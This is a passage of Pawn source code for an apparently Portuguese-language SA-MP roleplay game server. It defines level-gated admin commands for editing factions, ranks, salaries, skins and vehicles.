    	format(bInfo[i][Owner], 32, "%s", "Ninguém");
    	
    	AtualizarBiz(i);
	}
	
	GuardarBizzes();
    SendClientMessage(playerid, COLOR_INFO, "Deste reset a todas as lojas do servidor");

    return 1;
}

COMMAND:afactioncmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de FACTION:] {FFFFFF}/afactionsetrank - /afactioncolor - /afactionspawn - /afactionname");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de FACTION:] {FFFFFF}/afactiontype - /afactionjoinrank - /afactionbank - /afactionskin - /afactionlegal");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de FACTION:] {FFFFFF}/afactionranksalario - /afactionkick - /afactionuseduty - /afactiondutypos");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de FACTION:] {FFFFFF}/afactionrankname - /afactioninfo - /afactionlist");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:afactionlist(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[64];

	for(new i = 0; i < MAX_FACTIONS; i++)
	{
		if(i == 0) continue;
		
		format(string, sizeof(string), "[FACTION (%d)]: {FFFFFF}%s", i, fInfo[i][Nome]);
		SendClientMessage(playerid, COLOR_ORANGE, string);
	}

    return 1;
}

COMMAND:afactioninfo(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, string[256];

    if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactioninfo <id>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    
    new legal[4], useduty[4];
    
    if(fInfo[faction][Legal] == 1)
    {
        legal = "Sim";
    }
    else
    {
        legal = "Não";
    }
    
    if(fInfo[faction][UseDuty] == 1)
    {
        useduty = "Sim";
    }
    else
    {
        useduty = "Não";
    }
    
	format(string, sizeof(string), "Faction: %s - Cor: %s - Faction Type: %d - Join Rank: %s - Banco: %d$ - Legal: %s - UseDuty: %s", fInfo[faction][Nome], fInfo[faction][Color], fInfo[faction][Type], GetRankName(faction, fInfo[faction][JoinRank]), fInfo[faction][Bank], legal, useduty);
	SendClientMessage(playerid, COLOR_ORANGE, string);
    format(string, sizeof(string), "Rank 1: %s - Rank 2: %s - Rank 3: %s - Rank 4: %s - Rank 5: %s - Rank 6: %s", GetRankName(faction, 1), GetRankName(faction, 2), GetRankName(faction, 3), GetRankName(faction, 4), GetRankName(faction, 5), GetRankName(faction, 6));
	SendClientMessage(playerid, COLOR_ORANGE, string);
    format(string, sizeof(string), "Skin 1: %d - Skin 2: %d - Skin 3: %d - Skin 4: %d - Skin 5: %d - Skin 6: %d", fInfo[faction][SkinRank1], fInfo[faction][SkinRank2], fInfo[faction][SkinRank3], fInfo[faction][SkinRank4], fInfo[faction][SkinRank5], fInfo[faction][SkinRank6]);
	SendClientMessage(playerid, COLOR_ORANGE, string);
    format(string, sizeof(string), "Salário 1: %d$ - Salário 2: %d$ - Salário 3: %d$ - Salário 4: %d$ - Salário 5: %d$ - Salário 6: %d$", fInfo[faction][SalarioRank1], fInfo[faction][SalarioRank2], fInfo[faction][SalarioRank3], fInfo[faction][SalarioRank4], fInfo[faction][SalarioRank5], fInfo[faction][SalarioRank6]);
	SendClientMessage(playerid, COLOR_ORANGE, string);
	
    return 1;
}

COMMAND:afactionrankname(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, rank, nome[17], string[128];

    if(sscanf(params, "dds[16]", id, rank, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionrankname <faction> <rank> <nome>");

    if(id <= 0 || id > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");

	switch(rank)
	{
	    case 1:
	    {
	        format(fInfo[id][Rank1], 16, "%s", nome);
	    }
 	    case 2:
	    {
	        format(fInfo[id][Rank2], 16, "%s", nome);
	    }
 	    case 3:
	    {
	        format(fInfo[id][Rank3], 16, "%s", nome);
	    }
 	    case 4:
	    {
	        format(fInfo[id][Rank4], 16, "%s", nome);
	    }
 	    case 5:
	    {
	        format(fInfo[id][Rank5], 16, "%s", nome);
	    }
 	    case 6:
	    {
	        format(fInfo[id][Rank6], 16, "%s", nome);
	    }
	}

	GuardarFaction(id);

    format(string, sizeof(string), "Alteraste o nome do rank %d da faction %d para %s", rank, id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactiondutypos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, string[128];

    if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactiondutypos <id>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(fInfo[faction][UseDuty] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa faction tem o duty desativado");

	new Float:x, Float:y, Float:z, VW, Int;
	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);
	
	fInfo[faction][DutyX] = x;
	fInfo[faction][DutyY] = y;
	fInfo[faction][DutyZ] = z;
	fInfo[faction][DutyVirtualWorld] = VW;
	fInfo[faction][DutyInterior] = Int;

	GuardarFaction(faction);
	
	format(string, sizeof(string), "Alteraste a posição do duty da faction %s para atua posição", fInfo[faction][Nome]);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionuseduty(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, string[128];

    if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionuseduty <id>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    
    if(fInfo[faction][UseDuty] == 0)
    {
        format(string, sizeof(string), "Ativaste o duty na faction %s", fInfo[faction][Nome]);
        fInfo[faction][UseDuty] = 1;
    }
    else
    {
        format(string, sizeof(string), "Desativaste o duty na faction %s", fInfo[faction][Nome]);
        fInfo[faction][UseDuty] = 0;
    }

	GuardarFaction(faction);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionkick(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionkick <giveplayerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, MSG_NOTCONNECTED);
    if(pInfo[giveplayerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não está em nenhuma faction");

    format(string, sizeof(string), "Expulsaste o jogador %s da faction %s", GetPlayerNameEx(giveplayerid), fInfo[pInfo[giveplayerid][Faction]][Nome]);

    pInfo[giveplayerid][Faction] = 0;
	pInfo[giveplayerid][FactionRank] = 0;

    SendClientMessage(playerid, COLOR_INFO, string);
    
    format(string, sizeof(string), "Foste expulso da tua faction pelo Administrador %s", GetPlayerNameEx(playerid));
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionranksalario(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, rank, montante, string[128];

    if(sscanf(params, "ddd", faction, rank, montante)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionranksalario <faction> <rank> <Salário>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Skin inválida");
    if(montante < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

	switch(rank)
	{
	    case 1:
	    {
	        fInfo[faction][SalarioRank1] = montante;
	    }
	    case 2:
	    {
	        fInfo[faction][SalarioRank2] = montante;
	    }
	    case 3:
	    {
	        fInfo[faction][SalarioRank3] = montante;
	    }
	    case 4:
	    {
	        fInfo[faction][SalarioRank4] = montante;
	    }
	    case 5:
	    {
	        fInfo[faction][SalarioRank5] = montante;
	    }
	    case 6:
	    {
	        fInfo[faction][SalarioRank6] = montante;
	    }
	}
    GuardarFaction(faction);

    format(string, sizeof(string), "Setaste o Salário do rank %d da faction %s para %d$", rank, fInfo[faction][Nome], montante);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionskin(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, rank, skin, string[128];

    if(sscanf(params, "ddd", faction, rank, skin)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionskin <faction> <rank> <skin>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Skin inválida");
    if(skin < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Skin inválida");

	switch(rank)
	{
	    case 1:
	    {
	        fInfo[faction][SkinRank1] = skin;
	    }
	    case 2:
	    {
	        fInfo[faction][SkinRank2] = skin;
	    }
	    case 3:
	    {
	        fInfo[faction][SkinRank3] = skin;
	    }
	    case 4:
	    {
	        fInfo[faction][SkinRank4] = skin;
	    }
	    case 5:
	    {
	        fInfo[faction][SkinRank5] = skin;
	    }
	    case 6:
	    {
	        fInfo[faction][SkinRank6] = skin;
	    }
	}
    GuardarFaction(faction);

    format(string, sizeof(string), "Setaste a skin %d para o rank %d da faction %s", skin, rank, fInfo[faction][Nome]);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionbank(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, dinheiro, string[128];

    if(sscanf(params, "dd", faction, dinheiro)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionbank <faction> <montante>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(dinheiro < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Montante inválido");

    fInfo[faction][Bank] = dinheiro;
    GuardarFaction(faction);

    format(string, sizeof(string), "Setaste o dinheiro da faction %s para %d$", fInfo[faction][Nome], dinheiro);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionjoinrank(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, rank, string[128];

    if(sscanf(params, "dd", faction, rank)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionjoinrank <faction> <rank de entrada>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");

    fInfo[faction][JoinRank] = rank;
    GuardarFaction(faction);

    format(string, sizeof(string), "Pusteste o rank de entrada da faction %s para %d", fInfo[faction][Nome], rank);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactiontype(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, type, string[128];

    if(sscanf(params, "dd", faction, type))
	{
        SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactiontype <faction> <type>");
        
        SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}1: Polícia - 2: Médicos - 3: Mecénicos - 4: News - 5: Governo - 6: Drogas");
        SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}7: Máfia - 8: Street Racers");
        
		return 1;
	}
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(type <= 0 || type > 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Type inválido");

    fInfo[faction][Type] = type;
    GuardarFaction(faction);

    format(string, sizeof(string), "Pusteste a faction %s como type %d", fInfo[faction][Nome], type);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionlegal(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, string[128];

    if(sscanf(params, "dd", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionlegal <faction>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	if(fInfo[faction][Legal] == 0)
	{
	    fInfo[faction][Legal] = 1;
	    format(string, sizeof(string), "Setaste a faction %s para legal", fInfo[faction][Nome]);
	}
	else
	{
	    fInfo[faction][Legal] = 0;
	    format(string, sizeof(string), "Setaste a faction %s para ilegal", fInfo[faction][Nome]);
	}
    GuardarFaction(faction);

    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionname(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[17], string[128];

    if(sscanf(params, "ds[16]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionname <faction> <nome>");
    
    if(id <= 0 || id > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	format(fInfo[id][Nome], 32, "%s", nome);
	GuardarFaction(id);

    format(string, sizeof(string), "Alteraste o nome da faction %d para %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionspawn(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, string[128], Float:x, Float:y, Float:z, Float:a;

    if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactioncolor <faction> ");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	
	fInfo[faction][X] = x;
	fInfo[faction][Y] = y;
	fInfo[faction][Z] = z;
	fInfo[faction][A] = a;
	GuardarFaction(faction);

    format(string, sizeof(string), "Setaste o spawn da faction %s para a tua posição", fInfo[faction][Nome]);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactioncolor(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new faction, color[16], string[128];

    if(sscanf(params, "ds[16]", faction, color)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactioncolor <faction> <cor hexadecimal>");
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	format(fInfo[faction][Color], 32, "%s", color);
	GuardarFaction(faction);

    format(string, sizeof(string), "Alteraste a cor da faction %s para %s", fInfo[faction][Nome], color);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:afactionsetrank(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, faction, rank, string[128];

    if(sscanf(params, "ddd", giveplayerid, faction, rank)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionsetrank <playerid> <faction> <rank>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");
    
    pInfo[giveplayerid][Faction] = faction;
    pInfo[giveplayerid][FactionRank] = rank;
    
    format(string, sizeof(string), "Puseste o jogador %s na faction %s com o rank %d", GetPlayerNameEx(giveplayerid), fInfo[faction][Nome], rank);
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s colocou-te na faction %s com o rank %d", GetPlayerNameEx(playerid), fInfo[faction][Nome], rank);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:acarcmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de CARROS:] {FFFFFF}/resetcarros - /acartype - /acarfaction - /acarmodel - /acarcolor - /acarpark");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de CARROS:] {FFFFFF}/editarchave - /acarenter - /getvhere - /aresettuning - /acarinfo");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:acarinfo(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);
	new string[128];
	
	format(string, sizeof(string), "_______________________________________[CAR INFO %d]_______________________________________", car);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Matrícula: {FFFFFF}%s - {52E3BA}Modelo: {FFFFFF}%d - {52E3BA}Faction: {FFFFFF}%d", cInfo[car][Matricula], cInfo[car][Model], cInfo[car][Faction]);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Type: {FFFFFF}%d - {52E3BA}Comprado: {FFFFFF}%d - {52E3BA}Apreendido: {FFFFFF}%d", cInfo[car][Type], cInfo[car][Comprado], cInfo[car][Apreendido]);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Proprietário: {FFFFFF}%s - {52E3BA}CompradoEm: {FFFFFF}%s - {52E3BA}RadioStatus: {FFFFFF}%d", cInfo[car][Prop], cInfo[car][CompradoEm], cInfo[car][RadioStatus]);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "IsCaravana: {FFFFFF}%d - {52E3BA}CaravanaCasaID: {FFFFFF}%d", cInfo[car][IsCaravana], cInfo[car][CaravanaCasaID]);
	SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "__________________________________________________________________________________________", car);
    SendClientMessage(playerid, COLOR_INFO, string);
    
    return 1;
}

COMMAND:aresettuning(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);

	cInfo[car][mod2] = 0;
	cInfo[car][mod3] = 0;
	cInfo[car][mod4] = 0;
	cInfo[car][mod5] = 0;
	cInfo[car][mod6] = 0;
	cInfo[car][mod7] = 0;
	cInfo[car][mod8] = 0;
	cInfo[car][mod9] = 0;
	cInfo[car][mod10] = 0;
	cInfo[car][mod11] = 0;
	
	ChangeVehiclePaintjob(car, 3);
	RemoveVehicleComponent(car, cInfo[car][mod1]);
	RemoveVehicleComponent(car, cInfo[car][mod2]);
	RemoveVehicleComponent(car, cInfo[car][mod3]);
	RemoveVehicleComponent(car, cInfo[car][mod4]);
	RemoveVehicleComponent(car, cInfo[car][mod5]);
	RemoveVehicleComponent(car, cInfo[car][mod6]);
	RemoveVehicleComponent(car, cInfo[car][mod7]);
	RemoveVehicleComponent(car, cInfo[car][mod8]);
	RemoveVehicleComponent(car, cInfo[car][mod9]);
	RemoveVehicleComponent(car, cInfo[car][mod10]);
	RemoveVehicleComponent(car, cInfo[car][mod11]);

	GuardarCarro(car);
	
	SendClientMessage(playerid, COLOR_INFO, "Tuning resetado");

    return 1;
}

COMMAND:respawnjoblic(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    if(RespawnCounterJob != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já há um respawn a decorrer");

    new string[128];

	RespawnCounterJob = 1;

 	TimerRespawnJobFac = SetTimer("RespawnJobFac", 1000, true);
 	format(string, sizeof(string), "Respawn de Job/Licenças iniciado por %s", GetPlayerNameEx(playerid));

	SendClientMessageToAll(COLOR_CHAT, string);

    return 1;
}

COMMAND:respawngeral(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    if(RespawnCounter != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já há um respawn a decorrer");

    new string[128];

	RespawnCounter = 1;

	TimerRespawn = SetTimer("RespawnGeral", 1000, true);
 	format(string, sizeof(string), "Respawn geral iniciado por %s", GetPlayerNameEx(playerid));

	SendClientMessageToAll(COLOR_CHAT, string);

    return 1;
}

COMMAND:respawncarro(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 2) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOADMIN);
    
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);
	new string[128];

	IsARespawn[car] = true;
	SetVehicleToRespawn(car);
	AtualizarDanosCarro(car);

    format(string, sizeof(string), "Respawnaste o carro %d", car);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acarenter(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 2) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
    new car;
    
    if(sscanf(params, "d", car)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acarenter <id>");
    if(IsVehicleOccupied(car)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo está ocupado");
    if(car <= 0 || car > (MAX_CARROS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Veículo inválido");

	new string[128];
	
    PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
    
    format(string, sizeof(string), "Entraste no carro %d", car);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:getvhere(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 2) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new car;

    if(sscanf(params, "d", car)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/getvhere <id>");
    if(IsVehicleOccupied(car)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo está ocupado");
    if(car <= 0 || car > (MAX_CARROS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Veículo inválido");

	new string[128];
	new Float:plocx,Float:plocy,Float:plocz;

	GetPlayerPos(playerid, plocx, plocy, plocz);
	SetPlayerPosEx(playerid, plocx+0.3, plocy+0.3, plocz);
	SetVehiclePosEx(car, plocx, plocy, plocz);

    format(string, sizeof(string), "Trouxeste o carro %d até ti", car);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:editarchave(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, slot, id;

    if(sscanf(params, "ddd", giveplayerid, slot, id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/editarchave <playerid> <slot> <id>");
	if(slot < 1 || slot > 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	
	new string[128];
	
	switch(slot)
	{
	    case 1: { pInfo[giveplayerid][ChaveCarro1] = id; }
	    case 2: { pInfo[giveplayerid][ChaveCarro2] = id; }
	    case 3: { pInfo[giveplayerid][ChaveCarro3] = id; }
	    case 4: { pInfo[giveplayerid][ChaveCarro4] = id; }
	    case 5: { pInfo[giveplayerid][ChaveCarroEmp1] = id; }
	    case 6: { pInfo[giveplayerid][ChaveCarroEmp2] = id; }
	    case 7: { pInfo[giveplayerid][ChaveCarroEmp3] = id; }
	    case 8: { pInfo[giveplayerid][ChaveCarroEmp4] = id; }
	}

    format(string, sizeof(string), "Editaste a chave do jogador %s. Slot %d agora é do carro %d", GetPlayerNameEx(giveplayerid), slot, id);
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s setou a chave do slot %d para %d", GetPlayerNameEx(playerid), slot, id);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acarpark(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

    new car = GetPlayerVehicleID(playerid);
    new string[128];
    new Float:cx, Float:cy, Float:cz, Float:angle, vw, interior, Float:hp;
    vw = GetPlayerVirtualWorld(playerid);
    interior = GetPlayerInterior(playerid);
    
    GetVehicleHealth(car, hp);
    GetVehicleZAngle(car, angle);
    GetPlayerPos(playerid, cx, cy, cz);

	cInfo[car][X] = cx;
	cInfo[car][Y] = cy;
	cInfo[car][Z] = cz;
	cInfo[car][Angle] = angle;
	cInfo[car][VirtualWorld] = vw;
	cInfo[car][Interior] = interior;

	GuardarCarro(car);
	DestroyVehicle(cInfo[car][ID]);

    IsARespawn[car] = true;
	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
	AtualizarDanosCarro(car);
	AtualizarTunning(car);
	SetVehicleHealth(car, hp);

    format(string, sizeof(string), "Estacionaste aqui o carro %d", car);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acarcolor(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new c1, c2;

    if(sscanf(params, "dd", c1, c2)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acarcolor <cor 1> <cor 2>");
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

    new car = GetPlayerVehicleID(playerid);
    new string[128];
    
    cInfo[car][Color1] = c1;
    cInfo[car][Color2] = c2;
    
    ChangeVehicleColor(car, cInfo[car][Color1], cInfo[car][Color2]);
	
	GuardarCarro(car);

    format(string, sizeof(string), "Alteraste a cor do carro %d para %d e %d", car, c1, c2);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acarmodel(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acarmodel <model>");
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    if(id < 400 || id > 611) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Cidade inválida.");

    new car = GetPlayerVehicleID(playerid);
    new string[128];
    new Float:cx, Float:cy, Float:cz, Float:angle;
    
    GetVehiclePos(cInfo[car][ID], cx, cy, cz);
